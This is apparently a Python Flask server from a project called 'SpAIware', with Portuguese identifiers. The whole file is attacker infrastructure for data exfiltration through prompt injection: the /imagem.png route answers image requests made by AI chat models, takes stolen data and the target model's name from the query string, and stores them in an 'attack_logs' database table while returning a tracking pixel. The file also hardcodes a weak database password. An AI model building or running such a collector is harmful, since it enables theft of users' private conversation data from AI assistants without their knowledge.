from flask import Flask, request, send_file
import psycopg2
from datetime import datetime
import io

app = Flask(__name__)


DB_CONFIG = {
    'dbname': 'spaiware_db',
    'user': 'postgres',
    'password': '1234', 
    'host': 'localhost',
    'port': '5432'
}

def salvar_no_banco(modelo, dados, payload_bruto):
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cursor = conn.cursor()
        
        query = """
            INSERT INTO attack_logs (target_model, exfiltrated_data, raw_payload)
            VALUES (%s, %s, %s)
        """
        cursor.execute(query, (modelo, dados, payload_bruto))
        
        conn.commit()
        cursor.close()
        conn.close()
        print(f"[SUCESSO] Dados salvos no banco!")
    except Exception as e:
        print(f"[ERRO NO BANCO] {e}")

@app.route('/imagem.png', methods=['GET'])
def capturar_dados():
    dados_roubados = request.args.get('dados', 'Nenhum dado encontrado')
    modelo_alvo = request.args.get('modelo', 'Desconhecido')
    
    print("-" * 40)
    print(f"[{datetime.now()}] ATAQUE RECEBIDO!")
    print(f"Modelo: {modelo_alvo}")
    print(f"Dados: {dados_roubados}")
    
    payload_completo = request.url
    salvar_no_banco(modelo_alvo, dados_roubados, payload_completo)
    
    #filé
    img_bytes = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa7\xdc\xfc\xfd\x00\x00\x00\x00IEND\xaeB`\x82')
    img_bytes.seek(0)
    
    return send_file(img_bytes, mimetype='image/png')

if __name__ == '__main__':
    print(">>> Servidor SpAIware rodando na porta 5000...")
    app.run(port=5000)